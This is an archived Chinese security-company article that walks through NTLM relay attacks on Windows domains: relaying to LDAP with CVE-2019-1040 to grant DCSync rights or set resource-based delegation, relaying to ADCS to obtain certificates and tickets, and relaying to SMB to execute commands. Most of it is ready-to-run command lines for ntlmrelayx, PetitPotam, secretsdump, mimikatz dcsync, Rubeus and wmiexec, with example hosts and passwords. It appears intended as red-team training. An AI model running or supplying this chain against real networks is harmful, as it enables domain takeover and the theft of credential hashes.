> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PtSy7-c8H14FEckIgk0tug)

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NS91mBZNr1EcT1iapV98jGjCApuCaP2SCtVLLibcjSMNu7ZwVIdJqjPHLzRicUYauQezYC8UyiaPMBnH/640?wx_fmt=svg)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NS91mBZNr1EcT1iapV98jGjCApuCaP2SCtVLLibcjSMNu7ZwVIdJqjPHLzRicUYauQezYC8UyiaPMBnH/640?wx_fmt=svg)

前言

捕获到 Net-NTLM Hash 后，可以使用 Hashcat 破解 Net-NTLM Hash 得到密码明文，或者将 net-ntlm 中继到其他使用 NTLM 进行认证的应用层上。例如：可将 net-hash 中继到 SMB、adcs HTTP 服务、LDAP。但是在 ms08-067 kb957097 补丁中，禁止将自身的 NTLM 转发给自身。

可利用 Print bug 漏洞或 Petitpotam 漏洞强制目标主机回连。或诱导目标点击 UNC 路径

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NS91mBZNr1EcT1iapV98jGjCApuCaP2SCtVLLibcjSMNu7ZwVIdJqjPHLzRicUYauQezYC8UyiaPMBnH/640?wx_fmt=svg)

  

relay 到 ldap 服务

将 net-ntlm hash 转发到 lDap 服务，配合 CVE-2019-1040 漏洞绕过 ldap 签名

**添加 ACL**

relay 到 ldap 服务，添加 dscyns 权限 ACL。需要 net-NTLM 对应的用户具有对域对象 WriteDacl 权限。

**relay exchange**

将 exchange 的 NTLM Net-NTLM 继到域控上的 ldap 服务。利用 CVE-2019-1040 漏洞删除 ldap mic 签名标志，向指定账户授予 DCSync 权限。exchange 机器用户对域对象具有 WriteDACL 权限。

（windows 中可回连内网机器 A，然后将 A 的 445 端口流量重定向至外网 kali 监听的 445）

```
# -remove-mic：利用CVE-2019-1040漏洞清除MIC标志# -escalate-user：用于赋予指定用户dcsync权限，修改acl `Security Descriptor`条目赋予用户DCSync权限；# -smb2support：支持SMB2协议# -t：将认证凭据转发到指定ldap# -debug：输出详细信息python3 ntlmrelayx.py --remove-mic --escalate-user admin -t ldap://192.168.10.250 -smb2support -debug
```

利用 PetitPotam 漏洞或者打印机漏洞，强制 exchange 服务器回连指定主机

```
python3 Petitpotam.py -d qaq.com -u admin -p P@ss1234 192.168.10.25 192.168.10.30# 在windows环境下使用当前会话凭证利用Petitpotam漏洞强制回连。注意需要域用户权限，权限不足会报错PetitPotam.exe 10.211.55.2 10.211.55.5 1
```

```
# 使用提权的用户进行dcsyncpython3 secretsdump.py qaq.com/admin:Aa123456@192.168.10.250  -dc-ip 192.168.10.250 -just-dc   -outputfile qaq
```

**修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性**

relay 到 ldap 服务，修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性为目标配置资源委派，然后获取目标权限。

例如：  
1. 中继辅域控机器用户的 NTLM 设置资源委派获取辅域控权限；  
2. 中继 adcs/exchange 的机器用户 NTLM 设置资源委派获取目标权限，前提是 adcs 和 exchange 不能和域控为同一台服务器；  
3. 中继其他有价值的目标的机器用户 NTLM 获取权限；

**基于资源的约束性委派进行权限提升**  

设置资源委派属性获取目标权限。

1. 新创建机器用户

```
powershell -exec bypass  "&{import-module .\Powermad.ps1; New-MachineAccount -MachineAccount xxx -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose }"
```

2. 开启 NTLM 监听转发到 ldap  
(windows 中可回连内网机器 A，然后将 A 的 445 端口流量重定向至外网 kali 监听的 445）  

```
# 写入msDS-AllowedToActOnBehalfOfOtherIdentity为新建的机器用户，设置资源委派python3.8 ntlmrelayx.py -t ldap://192.168.11.250  --remove-mic --delegate-access --escalate-user xxx$ -smb2support
```

```
# 默认创建机器用户，将资源委派设置成新创建的机器用户python ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support
```

3. 利用 PetitPotam 漏洞或者打印机漏洞发起回连：

```
python3  PetitPotam.py   -d qaq.org -u admin -p Aa123456  192.168.11.15  192.168.11.24
```

4. 查看机器的 msds-allowedtoactonbehalfofotheridentity 舒服是否被修改成功

```
# 查看所有机器powershell -exec bypass "&{import-module .\powerview.ps1; Get-NetComputer  | Select-Object -Property name,msds-allowedtoactonbehalfofotheridentity}"# 查看指定机器powershell -exec bypass "&{import-module .\powerview.ps1; Get-DomainComputer win-2012  -Properties msds-allowedtoactonbehalfofotheridentity}"
```

5. 使用新加的机器用户发起 S4u2 请求

*   impacket 利用
    

```
# 利用s4u2协议域管用户访问机器的票据python getST.py -dc-ip 192.168.11.250 -spn cifs/win-2012.qaq.org  -impersonate administrator  qaq.org/xxx$:123456export KRB5CCNAME=administrator.ccachepython3 wmiexec.py -no-pass -k WIN-2012.qaq.org   -dc-ip 192.168.11.250
```

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NS91mBZNr1EcT1iapV98jGjCApuCaP2SCtVLLibcjSMNu7ZwVIdJqjPHLzRicUYauQezYC8UyiaPMBnH/640?wx_fmt=svg)

relay 到 adcs http 服务

1. 开启监听中继到 ADCS 的 http 接口

```
python3 ntlmrelayx.py -t http://192.168.12.240/certsrv/certfnsh.asp -smb2support --adcs
```

*   利用打印机服务漏洞或 PetitPotam 强制域控回连攻击机器：
    
    ```
    # 利用Petitpotam漏洞触发回连python Petitpotam.py -d domain -u username -p password 回连ip 域控ip
    ```
    
*   利用上面获取到的证书，发起 kerberos 认证获取域管账户的 TGT 并注入到当前机器的内存中：
    
    ```
    # 使用Rubeus利用证书发起kerberos认证申请TGT并注入lsass进程# Rubeus.exe asktgt /user:DC$ /certificate:打印出来的base64证书数据 /pttRubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
    ```
    

```
mimikatz.exe "lsadump::dcsync /domain:qaq.com /dc:test.qaq.com  /all /csv " exit
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NS91mBZNr1EcT1iapV98jGjCApuCaP2SCtVLLibcjSMNu7ZwVIdJqjPHLzRicUYauQezYC8UyiaPMBnH/640?wx_fmt=svg)

relay 到 smb 服务

relay 到 smb 服务执行命令。只有域控 smb 默认开启签名。

```
# impacket  python3 ntlmrelayx.py -t smb://192.168.10.139 -smb2support -c ipconfig # Responder Tools MultiRelay.py脚本 python3 MultiRelay.py -t 192.168.10.139 -u all  # 获取交互式shell
```

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20 杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXy7ibcngbWaNWA9EFFtgYTVSapXOJ7LAq5ib3XZhXVfm2Z0QnzS8cEp4MbN8aTmiatHBUxvLCCiaz4bg/640?wx_fmt=jpeg)

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JXy7ibcngbWaNWA9EFFtgYTV3WpmNLacJibDQUuULiarmAfxLakKiceKt9UuVoE9ibewduc3vbvkkRHEog/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXy7ibcngbWaNWA9EFFtgYTVAYiat1EcBReJThdnuW4dmbLOkfBGIunkFnJE1LbJlbd2qialcGGicbaMA/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JXy7ibcngbWaNWA9EFFtgYTV8icZjIKwYZiaFIPbQVGwficdPepQxn0NUJfaic0qV4SuqwJNBKghbrLWTQ/640?wx_fmt=gif)

**长按识别二维码关注我们**